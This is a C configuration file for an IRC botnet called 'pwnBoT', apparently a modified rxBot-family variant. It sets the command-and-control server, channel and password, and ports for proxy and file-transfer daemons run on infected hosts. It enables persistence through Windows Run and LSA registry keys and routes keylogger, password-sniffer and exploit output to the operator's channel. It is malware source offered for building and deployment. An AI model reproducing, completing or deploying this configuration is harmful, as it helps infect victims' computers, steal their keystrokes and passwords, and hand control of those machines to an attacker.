// bot configuration (generic) - doesn't need to be encrypted
unsigned short port = 6667;			// server port
unsigned short port2 = 6667;		// backup server port
unsigned short socks4port = 12221;	// Port # for sock4 daemon to run on  - CHANGE THIS!!!
unsigned short tftpport = 69;		// Port # for tftp daemon to run on
unsigned short httpport = 2001;		// Port # for http daemon to run on
unsigned short ftpport = 21;		// Port # for ftp daemon to run on
unsigned short rloginport = 513;	// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;				// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;			// use random file name
BOOL AutoStart = TRUE;				// enable autostart registry keys
char prefix = '-';					// command prefix (one character max.)
int maxrand = 6;					// how many random numbers in the nick
int nicktype = CONSTNICK;			// nick type (see rndnick.h)
BOOL nickprefix = TRUE;				// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\windows\\debug.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

// INSERT OUTPUT FROM -ENCRYPT COMMAND HERE!!


#else

char botid[] = "pwnBoT";							// bot id
char version[] = "[pwnBoT v0.1a BETA SeminolePride Mod]";			// Bots -ver reply
char password[] = "urpass";						// bot password
char server[] = "irc.urserver.net";			// server
char serverpass[] = "";							// server password
char channel[] = "#pwnbot";					// channel that the bot should join
char chanpass[] = "pwnbot";							// channel password
char server2[] = "irc.urserver1.com";							// backup server (optional)
char channel2[] = "#pwnbot";							// backup channel (optional)
char chanpass2[] = "pwnbot";							// backup channel password (optional)
char filename[] = "urfilename.exe";				// destination file name
char keylogfile[] = "keys.txt";					// keylog filename
char valuename[] = "ur key";			// value name for autostart
char nickconst[] = "[PWN]-";						// first part to the bot's nick
char modeonconn[] = "-x+B+i";						// Can be more than one mode and contain both + and -
char chanmode[] = "+n+t+s";						// Channel mode after joining
char exploitchan[] = "#pwnbot";						// Channel where exploit messages get redirected
char keylogchan[] = "#pwnbot";							// Channel where keylog messages get redirected
char psniffchan[] = "#pwnbot";							// Channel where psniff messages get redirected 

char *authost[] = {
	"*@*",
	"*@*"
};

char *versionlist[] = {
/*	"mIRC v6.18 Khaled Mardam-Bey",
    "mIRC v6.19 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
*/
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif
